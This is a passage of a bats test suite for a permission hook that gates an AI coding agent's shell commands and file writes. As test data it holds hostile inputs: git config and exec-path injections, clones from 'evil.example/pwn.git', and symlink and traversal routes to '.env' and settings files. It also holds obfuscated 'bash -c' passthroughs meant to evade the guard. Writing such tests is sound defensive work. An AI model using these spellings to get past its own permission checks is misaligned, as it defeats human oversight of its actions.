    write_project_hook_rules "[ask-commands]
ws exec *"
    mkdir -p "$WORK/.git"

    run_hook "ws exec yggdrasil git branch -f topic"

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"ask"'* ]]
}

@test "security: ws exec Git fast path rejects a target shadowed by a realm or hoard" {
    write_project_settings ''
    write_project_hook_rules "[ask-commands]
ws exec *"
    mkdir -p "$WORK/components/demo/.git"
    mkdir -p "$WORK/realms/demo/.git"
    cat > "$WORK/ecosystem.yaml" <<'YAML'
components:
  demo:
    repo: https://github.com/example/demo.git
YAML

    run_hook "ws exec demo git status"
    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"ask"'* ]]

    mv "$WORK/realms/demo" "$WORK/realms/demo-away"
    mkdir -p "$WORK/hoards/demo/.git"
    run_hook "ws exec demo git status"
    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"ask"'* ]]
}

@test "allow via settings: wildcard pattern matches args" {
    write_project_settings 'Bash(ws hoard upgrade *)'
    run_hook "ws hoard upgrade borgr"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
}

@test "allow via settings: CRLF line endings don't break matching" {
    # Write the settings file with explicit CRLF endings to simulate
    # autocrlf=true on Windows. The hook must strip the trailing \r
    # before pattern comparison or the `)` close-paren strip silently
    # fails, leaving `)` in the pattern and breaking every match.
    {
        printf '{\r\n'
        printf '  "permissions": {\r\n'
        printf '    "allow": [\r\n'
        printf '      "Bash(ws status)"\r\n'
        printf '    ]\r\n'
        printf '  }\r\n'
        printf '}\r\n'
    } > "$WORK/.claude/settings.json"

    run_hook "ws status"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
}

@test "security: nested settings cannot grant an allow" {
    seed_real_project_config
    local nested="$WORK/components/untrusted"
    mkdir -p "$nested/.claude"
    cat > "$nested/.claude/settings.json" <<'JSON'
{"permissions":{"allow":["Bash(evil *)"]}}
JSON

    run_hook "evil payload" "$nested"

    [ "$status" -eq 0 ]
    [ -z "$output" ]
}

@test "security: nested hook rules cannot replace the workspace baseline" {
    seed_real_project_config
    local nested="$WORK/components/untrusted"
    mkdir -p "$nested/.claude/hooks"
    printf '[ask-commands]\n' > "$nested/.claude/hooks/hook-rules"

    run_hook "git push origin topic" "$nested"

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"deny"'* ]]
    [[ "$output" == *"ws push"* ]]
}

@test "security: sensitive scratch state forces an ask instead of auto-allow" {
    seed_real_project_config

    run_hook_write "Write" "$WORK/.tmp/hook-bypass/git-commit.bypass"

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"ask"'* ]]
    [[ "$output" == *"security-sensitive workspace state"* ]]
}

@test "security: case variants cannot disguise sensitive scratch state" {
    seed_real_project_config
    if [[ ! "$WORK/.claude" -ef "$WORK/.CLAUDE" ]]; then
        ln -s "$WORK/.claude" "$WORK/.CLAUDE" 2>/dev/null || true
    fi
    [[ "$WORK/.claude" -ef "$WORK/.CLAUDE" ]] || skip "cannot simulate a case-insensitive project filesystem"

    run_hook_write "Write" "$WORK/.TMP/HOOK-BYPASS/git-commit.bypass"

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"ask"'* ]]
    [[ "$output" == *"security-sensitive workspace state"* ]]
}

@test "security: the shared Kubernetes guard helper requires approval to edit" {
    seed_real_project_config
    mkdir -p "$WORK/scripts"

    run_hook_write "Edit" "$WORK/scripts/ws-k8s-guard.sh"

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"ask"'* ]]
    [[ "$output" == *"security-sensitive workspace state"* ]]
}

@test "security: a scratch symlink alias to sensitive state still forces an ask" {
    seed_real_project_config
    mkdir -p "$WORK/.tmp"
    ln -s "$WORK/.claude" "$WORK/.tmp/security-alias" 2>/dev/null || true
    [[ -L "$WORK/.tmp/security-alias" ]] || skip "real symlinks not supported on this platform"

    run_hook_write "Write" "$WORK/.tmp/security-alias/settings.json"

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"ask"'* ]]
    [[ "$output" == *"security-sensitive workspace state"* ]]
}

@test "security: a scratch alias to the project root cannot hide a sensitive file" {
    seed_real_project_config
    mkdir -p "$WORK/.tmp"
    touch "$WORK/.env"
    ln -s "$WORK" "$WORK/.tmp/root-alias" 2>/dev/null || true
    [[ -L "$WORK/.tmp/root-alias" ]] || skip "real symlinks not supported on this platform"

    run_hook_write "Write" "$WORK/.tmp/root-alias/.env"

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"ask"'* ]]
    [[ "$output" == *"security-sensitive workspace state"* ]]
}

@test "security: parent traversal into sensitive config still forces an ask" {
    seed_real_project_config
    mkdir -p "$WORK/.tmp"

    run_hook_write "Write" "$WORK/.tmp/../.claude/settings.json"

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"ask"'* ]]
    [[ "$output" == *"security-sensitive workspace state"* ]]
}

@test "security: a final symlink into sensitive config still forces an ask" {
    seed_real_project_config
    mkdir -p "$WORK/.tmp"
    touch "$WORK/.env"
    ln -s "$WORK/.env" "$WORK/.tmp/env-alias" 2>/dev/null || true
    [[ -L "$WORK/.tmp/env-alias" ]] || skip "real symlinks not supported on this platform"

    run_hook_write "Write" "$WORK/.tmp/env-alias"

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"ask"'* ]]
    [[ "$output" == *"security-sensitive workspace state"* ]]
}

@test "security: a multi-hop final symlink into sensitive config still forces an ask" {
    seed_real_project_config
    mkdir -p "$WORK/.tmp"
    touch "$WORK/.env"
    ln -s "$WORK/.env" "$WORK/.tmp/env-target" 2>/dev/null || true
    ln -s "$WORK/.tmp/env-target" "$WORK/.tmp/env-alias" 2>/dev/null || true
    [[ -L "$WORK/.tmp/env-alias" ]] || skip "real symlinks not supported on this platform"

    run_hook_write "Write" "$WORK/.tmp/env-alias"

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"ask"'* ]]
    [[ "$output" == *"security-sensitive workspace state"* ]]
}

@test "security: session identity state forces an ask instead of auto-allow" {
    seed_real_project_config

    run_hook_write "Edit" "$WORK/.tmp/gdd-agent-sessions/session.env"

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"ask"'* ]]
}

# ─── Session env-file carve-out (sub-agent birth friction, #129 UX) ─
#
# Sub-agents legitimately create their own identity files under
# .tmp/gdd-agent-sessions/ (ws commit --co-author-file), and a session
# updating its own <sid>.env is equivalent to the allowlisted
# `ws whoami --set`. Creating a NEW .env file, or writing your OWN
# session file, auto-allows via the scratch tier — but guard-scope
# keys (GDD_K8S_*) in the content, overwrites of another session's
# existing file, and non-env names all still ask.

@test "allow: creating a new sub-agent identity env file rides the scratch allow" {
    seed_real_project_config

    run_hook_write_content "Write" "$WORK/.tmp/gdd-agent-sessions/sess--sub.env" \
        'GDD_CO_AUTHOR=Claude Fable 5 <noreply@anthropic.com>'

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"allow"'* ]]
}

@test "allow: a session writing its own session env file rides the scratch allow" {
    seed_real_project_config
    mkdir -p "$WORK/.tmp/gdd-agent-sessions"
    printf 'GDD_CO_AUTHOR=old\n' > "$WORK/.tmp/gdd-agent-sessions/sess-123.env"

    run_hook_write_content "Write" "$WORK/.tmp/gdd-agent-sessions/sess-123.env" \
        'GDD_CO_AUTHOR=Claude Fable 5 <noreply@anthropic.com>' "sess-123"

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"allow"'* ]]
}

@test "ask: a partial edit of the current session env file cannot bypass guard-key review" {
    seed_real_project_config
    mkdir -p "$WORK/.tmp/gdd-agent-sessions"
    printf 'GDD_K8S_CONTEXT=prod\n' > "$WORK/.tmp/gdd-agent-sessions/sess-123.env"

    run_hook_write_content "Edit" "$WORK/.tmp/gdd-agent-sessions/sess-123.env" \
        'dev' "sess-123"

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"ask"'* ]]
    [[ "$output" == *"security-sensitive workspace state"* ]]
}

@test "ask: overwriting another session's existing env file still asks" {
    seed_real_project_config
    mkdir -p "$WORK/.tmp/gdd-agent-sessions"
    printf 'GDD_CO_AUTHOR=other\n' > "$WORK/.tmp/gdd-agent-sessions/sess-other.env"

    run_hook_write_content "Write" "$WORK/.tmp/gdd-agent-sessions/sess-other.env" \
        'GDD_CO_AUTHOR=forged' "sess-123"

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"ask"'* ]]
    [[ "$output" == *"security-sensitive workspace state"* ]]
}

@test "ask: guard-scope keys in a new session env file still ask" {
    seed_real_project_config

    run_hook_write_content "Write" "$WORK/.tmp/gdd-agent-sessions/sess--sub.env" \
        $'GDD_CO_AUTHOR=x\nGDD_K8S_CONTEXT=gke_prod'

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"ask"'* ]]
    [[ "$output" == *"security-sensitive workspace state"* ]]
}

@test "ask: a non-env name under the sessions dir still asks" {
    seed_real_project_config

    run_hook_write_content "Write" "$WORK/.tmp/gdd-agent-sessions/notes.txt" 'hello'

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"ask"'* ]]
    [[ "$output" == *"security-sensitive workspace state"* ]]
}

@test "allow: a backslash-spelled Write path to a new sub-agent env file rides the scratch allow" {
    command -v cygpath >/dev/null 2>&1 || skip "cygpath not available to spell a Windows path"
    seed_real_project_config
    local win_path
    win_path="$(cygpath -w "$WORK/.tmp/gdd-agent-sessions/smoke-sub.env")"

    run_hook_write_content "Write" "$win_path" 'GDD_CO_AUTHOR=Smoke Sub <probe@example.com>'

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"allow"'* ]]
}

@test "ask: a backslash-spelled Write path cannot disguise guard-key session content" {
    command -v cygpath >/dev/null 2>&1 || skip "cygpath not available to spell a Windows path"
    seed_real_project_config
    local win_path
    win_path="$(cygpath -w "$WORK/.tmp/gdd-agent-sessions/smoke-sub2.env")"

    run_hook_write_content "Write" "$win_path" 'GDD_K8S_CONTEXT=nope'

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"ask"'* ]]
    [[ "$output" == *"security-sensitive workspace state"* ]]
}

@test "security: committed settings install Edit and Write hook matchers" {
    run jq -e '
        [.hooks.PreToolUse[].matcher] as $m |
        ($m | index("Edit")) != null and ($m | index("Write")) != null
    ' "$REPO_ROOT/.claude/settings.json"

    [ "$status" -eq 0 ]
}

@test "security: git config injection denies before an allow entry" {
    write_project_hook_rules ""
    write_project_settings 'Bash(git -c *)'

    run_hook "git -c alias.diff=!id diff"

    [[ "$output" == *'"permissionDecision":"deny"'* ]]
    [[ "$output" == *"Git execution modifier"* ]]
}

@test "security: abbreviated dangerous Git long options deny before broad allows" {
    write_project_hook_rules ""
    write_project_settings 'Bash(git *)'

    local command
    for command in \
        "git fetch --uplo=sh ." \
        "git --config-e=alias.status=!id status" \
        "git fetch --exe=sh ." \
        "git --exec-p=/tmp/evil log" \
        "git difftool --extc=sh HEAD" \
        "git diff --ext-d HEAD" \
        "git log --outp=.tmp/log" \
        "git log --output-d=.tmp/logs" \
        "git grep --open-f=cat needle"; do
        run_hook "$command"
        [ "$status" -eq 0 ]
        [[ "$output" == *'"permissionDecision":"deny"'* ]]
        [[ "$output" == *"Git execution modifier"* ]]
    done
}

@test "security: unrelated complete Git long options remain eligible for normal matching" {
    write_project_hook_rules ""
    write_project_settings 'Bash(git fetch *)'

    run_hook "git fetch --update-head-ok origin"

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"allow"'* ]]
}

@test "security: Git global exec-path denies before a broad allow" {
    write_project_hook_rules ""
    write_project_settings 'Bash(git *)'

    run_hook "git --exec-path=.tmp/git-review-probe review-probe"

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"deny"'* ]]
    [[ "$output" == *"Git execution modifier"* ]]
}

@test "security: git executable diff helper denies before a diff allow" {
    write_project_hook_rules ""
    write_project_settings 'Bash(git diff:*)'

    run_hook "git diff --ext-diff HEAD"

    [[ "$output" == *'"permissionDecision":"deny"'* ]]
    [[ "$output" == *"Git execution modifier"* ]]
}

@test "security: git output option denies before a log allow" {
    write_project_hook_rules ""
    write_project_settings 'Bash(git log:*)'

    run_hook "git log --output=.claude/settings.local.json --format=attacker"

    [[ "$output" == *'"permissionDecision":"deny"'* ]]
    [[ "$output" == *"Git execution modifier"* ]]
}

@test "security: git grep short pager option denies before a grep allow" {
    write_project_hook_rules ""
    write_project_settings 'Bash(git grep:*)'

    run_hook "git grep -Ovim secret"

    [[ "$output" == *'"permissionDecision":"deny"'* ]]
    [[ "$output" == *"Git execution modifier"* ]]
}

@test "security: git grep long pager option denies before a grep allow" {
    write_project_hook_rules ""
    write_project_settings 'Bash(git grep:*)'

    run_hook "git grep --open-files-in-pager=less secret"

    [[ "$output" == *'"permissionDecision":"deny"'* ]]
    [[ "$output" == *"Git execution modifier"* ]]
}

@test "security: unrelated Git -O option keeps its normal permission" {
    write_project_hook_rules ""
    write_project_settings 'Bash(git log:*)'

    run_hook "git log -Oorderfile"

    [[ "$output" == *'"permissionDecision":"allow"'* ]]
}

@test "security: bats allow cannot traverse from tests into scratch" {
    seed_real_project_config

    run_hook "bash tests/vendor/bats-core/bin/bats tests/../.tmp/evil.bats"

    [[ "$output" == *'"permissionDecision":"ask"'* ]]
    [[ "$output" == *"contained under tests"* ]]
}

@test "security: git diff continuation does not allow git difftool" {
    write_project_hook_rules ""
    write_project_settings 'Bash(git diff:*)'

    run_hook "git difftool HEAD"

    [ "$status" -eq 0 ]
    [ -z "$output" ]
}

@test "ask: benign quotes and repeated whitespace cannot hide review mutation" {
    seed_real_project_config

    run_hook 'ws   review knarr "threads" 123 "--resolve-all"'

    [[ "$output" == *'"permissionDecision":"ask"'* ]]
}

@test "ask: realm trust selection always lands on a human" {
    seed_real_project_config

    run_hook "ws realm use --trust realm-community"

    [[ "$output" == *'"permissionDecision":"ask"'* ]]
}

@test "ask: adding an arbitrary clone to the trusted ecosystem lands on a human" {
    seed_real_project_config

    run_hook "ws clone --url https://evil.example/pwn.git --name pwn --add-eco"

    [[ "$output" == *'"permissionDecision":"ask"'* ]]
}

@test "ask: canonical ecosystem adoption flag lands on a human" {
    seed_real_project_config

    run_hook "ws clone --url https://evil.example/pwn.git --name pwn --add-to-ecosystem"

    [[ "$output" == *'"permissionDecision":"ask"'* ]]
}

@test "ask: backslash escapes cannot hide an ask-tier option" {
    seed_real_project_config

    run_hook 'ws clone --url https://evil.example/pwn.git --name pwn --add\-eco'

    [[ "$output" == *'"permissionDecision":"ask"'* ]]
}

@test "security: a quoted literal backslash cannot become an allowlisted command" {
    write_project_hook_rules ""
    write_project_settings 'Bash(ws status)'

    run_hook "'w\\s' status"

    # Single-quote masking removes the backslash from Tier-1's view, so
    # this no longer lands on the backslash ask — but the security
    # property is that the smuggled spelling must never AUTO-ALLOW.
    # The raw string (quotes, backslash and all) is what the allowlist
    # matcher sees, and it does not match `ws status`.
    [[ "$output" != *'"permissionDecision":"allow"'* ]]
}

@test "ask: brace expansion cannot synthesize unreviewed command arguments" {
    seed_real_project_config

    run_hook 'ws clone --url https://evil.example/pwn.git --name pwn --{add-eco,quiet}'

    [[ "$output" == *'"permissionDecision":"ask"'* ]]
    [[ "$output" == *"Brace expansion"* ]]
}

# ─── Windows path-token backslash normalization (#133) ──────────────
#
# A backslash inside a drive-letter-rooted token (D:\dir\file) is
# unambiguous path data, not escape syntax — those tokens normalize to
# forward slashes before Tier 1 so the allowlist stays reachable on
# Windows. Every ambiguous backslash shape must still land on a human,
# and later Tier 1 arms (redirect, newline) must still fire after a
# token is normalized.

@test "deny: bare backslashed drive path is known-broken and teaches the fix" {
    write_project_hook_rules ""
    write_project_settings 'Bash(git -C * status)'

    run_hook 'git -C D:\Dev\GitWS\yggdrasil status'

    # Bash strips the single backslashes before git runs (the -C target
    # arrives as D:DevGitWSyggdrasil), so approving an ask would just run
    # a command that acts on the wrong path. Deny with the working
    # respellings instead of deferring the confusion to the human.
    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"deny"'* ]]
    [[ "$output" == *"Unquoted Windows path"* ]]
}

@test "allow: single-quoted backslash drive path matches the allowlist" {
    write_project_hook_rules ""
    write_project_settings 'Bash(git -C * status)'

    run_hook "git -C 'D:\\Dev\\GitWS\\yggdrasil' status"

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"allow"'* ]]
}

@test "allow: double-quoted backslash drive path matches the allowlist" {
    write_project_hook_rules ""
    write_project_settings 'Bash(git -C * status)'

    run_hook 'git -C "D:\Dev\GitWS\yggdrasil" status'

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"allow"'* ]]
}

@test "ask: escaped double quotes still require approval" {
    seed_real_project_config

    run_hook 'echo \"hi\"'

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"ask"'* ]]
    [[ "$output" == *"Backslash escapes"* ]]
}

@test "ask: trailing backslash still requires approval" {
    seed_real_project_config

    run_hook "ls D:\\Dev\\"

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"ask"'* ]]
    [[ "$output" == *"Backslash escapes"* ]]
}

@test "ask: doubled backslash in a drive path still requires approval" {
    seed_real_project_config

    run_hook 'ls D:\\Dev'

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"ask"'* ]]
    [[ "$output" == *"Backslash escapes"* ]]
}

@test "deny: redirect after a normalized quoted Windows path still denies" {
    run_hook 'cat "D:\Dev\notes.txt" > out.txt'

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"deny"'* ]]
    [[ "$output" == *"redirection"* ]]
}

@test "deny: redirect with a bare backslash path still denies (not downgraded to ask)" {
    run_hook 'cat D:\Dev\notes.txt > out.txt'

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"deny"'* ]]
    [[ "$output" == *"redirection"* ]]
}

@test "deny: newline list with a Windows path still denies" {
    run_hook $'ls D:\\Dev\npwd'

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"deny"'* ]]
    [[ "$output" == *"Newline-separated"* ]]
}

# ─── Single-quote masking (Tier 1 sees bash's parse) ────────────────
#
# Bash gives single-quoted content zero special meaning, so operator
# substrings inside single quotes must not trip Tier-1 arms — that
# false-positive class (BRE alternation in grep patterns, semicolons
# in message strings, pipes in yq expressions) was the workspace's
# dominant source of pointless prompts. Everything OUTSIDE single
# quotes must keep exactly its old classification, and the bail-outs
# (unquoted backslash, unterminated quote) must stay conservative.

@test "masking: BRE alternation inside single quotes passes Tier 1" {
    seed_real_project_config

    run_hook "grep -rn 'samples/\\|case-studies' docs/"

    [ "$status" -eq 0 ]
    [[ "$output" != *'"permissionDecision":"deny"'* ]]
    [[ "$output" != *"Backslash escapes"* ]]
}

@test "masking: single-quoted semicolon is data, not composition" {
    seed_real_project_config

    run_hook "printf '%s' 'a; b'"

    [ "$status" -eq 0 ]
    [[ "$output" != *'"permissionDecision":"deny"'* ]]
}

@test "masking: single-quoted pipe is data, not a pipeline" {
    seed_real_project_config

    run_hook "printf 'a|b'"

    [ "$status" -eq 0 ]
    [[ "$output" != *'"permissionDecision":"deny"'* ]]
}

@test "masking: newline inside single quotes is data, not a separator" {
    seed_real_project_config

    run_hook $'printf \'a\nb\''

    [ "$status" -eq 0 ]
    [[ "$output" != *"Newline-separated"* ]]
}

@test "masking: unquoted operator after a masked span still denies" {
    seed_real_project_config

    run_hook "printf 'a' ; ls"

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"deny"'* ]]
    [[ "$output" == *"Shell composition"* ]]
}

@test "masking: expansion-free double-quoted operators are data (Phoenix case)" {
    seed_real_project_config

    run_hook 'grep -rn "AnnotationTypeWriter\|writeAnnotation" --include=*.java src/'

    [ "$status" -eq 0 ]
    [[ "$output" != *'"permissionDecision":"deny"'* ]]
    [[ "$output" != *"Backslash escapes"* ]]
}

@test "masking: defused dollar inside double quotes does not ask" {
    seed_real_project_config

    run_hook 'grep -c "\$" build/annotations.idx'

    [ "$status" -eq 0 ]
    [[ "$output" != *"parameter expansion"* ]]
    [[ "$output" != *"Backslash escapes"* ]]
}

@test "masking: live dollar inside double quotes still reaches the expansion ask" {
    seed_real_project_config

    run_hook 'echo "value: $SECRET"'

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"ask"'* ]]
    [[ "$output" == *"parameter expansion"* ]]
}

@test "masking: command substitution inside double quotes still denies" {
    seed_real_project_config

    run_hook 'echo "now: $(date)"'

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"deny"'* ]]
    [[ "$output" == *"substitution"* ]]
}

@test "masking: unterminated single quote bails out to the ask" {
    seed_real_project_config

    run_hook "echo 'a\\"

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"ask"'* ]]
    [[ "$output" == *"Backslash escapes"* ]]
}

@test "masking: backslash beside a live dollar in double quotes still prompts" {
    seed_real_project_config

    # The bare $ keeps the whole span visible to Tier 1, so the span's
    # backslash stays subject to classification — the expansion ask
    # (checked before the backslash arm) fires.
    run_hook 'grep "$prefix\|fallback" file.txt'

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"ask"'* ]]
}

@test "ask: bash -c interpreter passthrough is human-gated" {
    seed_real_project_config

    run_hook "bash -c 'echo hi'"

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"ask"'* ]]
}

@test "ask: sh -c interpreter passthrough is human-gated" {
    seed_real_project_config

    run_hook "sh -c 'echo hi'"

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"ask"'* ]]
}

@test "ask: absolute-path interpreter passthrough is gated too" {
    seed_real_project_config

    run_hook "/bin/bash -c 'echo hi'"

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"ask"'* ]]
}

@test "ask: env-prefixed interpreter passthrough is gated too" {
    seed_real_project_config

    run_hook "env FOO=1 bash -c 'echo hi'"

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"ask"'* ]]
}

@test "ask: append-assignment prefix cannot hide interpreter passthrough" {
    seed_real_project_config

    run_hook "X+=:/tmp bash --noprofile -c 'echo first; echo second'"

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"ask"'* ]]
}

@test "ask: indexed-array assignment cannot hide interpreter passthrough" {
    seed_real_project_config

    run_hook "A[0]=x bash --noprofile -c 'echo first; echo second'"

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"ask"'* ]]
}

@test "ask: single-character env assignment cannot hide interpreter passthrough" {
    seed_real_project_config

    run_hook "env X=1 bash --noprofile -c 'echo first; echo second'"

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"ask"'* ]]
}

@test "ask: option-bearing bash -c interpreter passthrough is gated" {
    seed_real_project_config

    run_hook "bash --noprofile -c 'echo first; echo second'"

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"ask"'* ]]
}

@test "ask: combined-option bash -lc interpreter passthrough is gated" {
    seed_real_project_config

    run_hook "bash -lc 'echo first; echo second'"

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"ask"'* ]]
}

@test "ask: quoted absolute option-bearing interpreter passthrough is gated" {
    seed_real_project_config

    run_hook '"/bin/bash" --noprofile -c "echo first; echo second"'

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"ask"'* ]]
}

@test "ask: env split-string command construction is human-gated" {
    seed_real_project_config

    run_hook 'env -S "bash --noprofile -c echo-first;echo-second"'

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"ask"'* ]]
}

@test "ask: quoted env wrapper cannot hide interpreter passthrough" {
    seed_real_project_config

    run_hook '"/usr/bin/env" bash --noprofile -c "echo first; echo second"'

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"ask"'* ]]
}

@test "ask: env argv0 operand cannot hide interpreter passthrough" {
    seed_real_project_config

    run_hook "env -a spoof bash --noprofile -c 'echo first; echo second'"

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"ask"'* ]]
}

@test "ask: env alternate-path operand cannot hide interpreter passthrough" {
    seed_real_project_config

    run_hook "env -P /bin bash --noprofile -c 'echo first; echo second'"

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"ask"'* ]]
}

@test "ask: unknown combined env options fail closed" {
    seed_real_project_config

    run_hook "env -iu NAME bash --noprofile -c 'echo first; echo second'"

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"ask"'* ]]
}

@test "ask: exec-wrapped interpreter passthrough is human-gated" {
    seed_real_project_config

    run_hook "exec bash --noprofile -c 'echo first; echo second'"

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"ask"'* ]]
}

@test "ask: quoted interpreter fragments cannot hide passthrough" {
    seed_real_project_config

    run_hook "bas''h --noprofile -c 'echo first; echo second'"

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"ask"'* ]]
}

@test "ask: quoted wrapper fragments cannot hide passthrough" {
    seed_real_project_config

    run_hook "e''nv bash --noprofile -c 'echo first; echo second'"

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"ask"'* ]]
}

@test "ask: quoted option fragments cannot hide passthrough" {
    seed_real_project_config

    run_hook "bash --noprofile '-'c 'echo first; echo second'"

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"ask"'* ]]
}

@test "ask: double-quoted line continuation cannot hide interpreter" {
    seed_real_project_config

    run_hook $'"bas\\\nh" --noprofile -c "echo first; echo second"'

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"ask"'* ]]
}

@test "interpreter parser ignores an unrelated quoted-space executable path" {
    seed_real_project_config

    run_hook '"C:/Program Files/tool.exe" --version'

    [ "$status" -eq 0 ]
    [[ "$output" != *'"permissionDecision":"ask"'* ]]
}

@test "interpreter parser consumes an attached -O option operand" {
    seed_real_project_config

    run_hook "bash -Ocompat31 script.sh"

    [ "$status" -eq 0 ]
    [[ "$output" != *'"permissionDecision":"ask"'* ]]
}

@test "interpreter parser consumes an attached -o option operand" {
    seed_real_project_config

    run_hook "bash -onoclobber script.sh"

    [ "$status" -eq 0 ]
    [[ "$output" != *'"permissionDecision":"ask"'* ]]
}

@test "interpreter parser stops at a script operand before a later -c" {
    seed_real_project_config

    run_hook "bash script.sh -c"

    [ "$status" -eq 0 ]
    [[ "$output" != *'"permissionDecision":"ask"'* ]]
}

@test "interpreter parser stops at the option terminator before a later -c" {
    seed_real_project_config

    run_hook "bash -- -c"

    [ "$status" -eq 0 ]
    [[ "$output" != *'"permissionDecision":"ask"'* ]]
}

@test "masking: double-quoted Windows path is not treated as bare/unquoted" {
    seed_real_project_config

    run_hook 'git -C "D:\Dev\GitWS\yggdrasil" status'

    [ "$status" -eq 0 ]
    [[ "$output" != *"Unquoted Windows path"* ]]
}

@test "masking: quoted drive path in a bailed-out command asks, not the bare-path deny" {
    seed_real_project_config

    # A spaced quoted path defeats the token normalizer (word split), and
    # the trailing unquoted backslash makes masking bail to the raw
    # string — so the backslash arm sees the word `"D:\Dev`. Quote-led
    # words must reach the generic ask: the bare-path deny's premise
    # (bash strips the backslashes) is false for quoted content.
    run_hook 'cp "D:\Dev My\a.txt" x\'

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"ask"'* ]]
    [[ "$output" != *"Unquoted Windows path"* ]]
}

# ─── gh repo fork → ws clone-fork redirect ──────────────────────────

@test "redirect: ws gh repo fork points at ws clone-fork" {
    seed_real_project_config

    run_hook 'ws gh repo fork Terasology/CoreWorlds --org SiliconSaga --clone=false'

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"deny"'* ]]
    [[ "$output" == *"ws clone-fork"* ]]
}

@test "redirect: raw gh repo fork gets the clone-fork pointer, not the generic gh one" {
    seed_real_project_config

    run_hook 'gh repo fork Terasology/CoreWorlds --clone=false'

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"deny"'* ]]
    [[ "$output" == *"ws clone-fork"* ]]
}

@test "ask: ws clone-fork --add-to-ecosystem is the component trust gate" {
    seed_real_project_config

    run_hook 'ws clone-fork --url https://github.com/x/y.git --add-to-ecosystem'

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"ask"'* ]]
}

@test "ask: ws clone-fork --add-eco alias is gated the same way" {
    seed_real_project_config

    run_hook 'ws clone-fork --url https://github.com/x/y.git --add-eco'

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"ask"'* ]]
}

# ─── working-tree-mutating gh subcommands at the workspace root ─────
#
# `ws gh` has no target and runs at the workspace root, so gh
# subcommands that rewrite the repo they stand in (`pr checkout`,
# `repo sync`) hit the WORKSPACE tree — this silently replaced
# yggdrasil's scripts/ with a Terasology PR on 2026-07-27 (Phoenix).
# The redirect turns that silent clobber into a corrective pointer at
# the ws exec form, which must itself never match the redirect.

@test "redirect: ws gh pr checkout denies with the ws exec pointer" {
    seed_real_project_config

    run_hook 'ws gh pr checkout 5334 --repo MovingBlocks/Terasology'

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"deny"'* ]]
    [[ "$output" == *"workspace ROOT"* ]]
    [[ "$output" == *"ws exec"* ]]
}

@test "redirect: raw gh pr checkout gets the same protection" {
    seed_real_project_config

    run_hook 'gh pr checkout 5334 --repo MovingBlocks/Terasology'

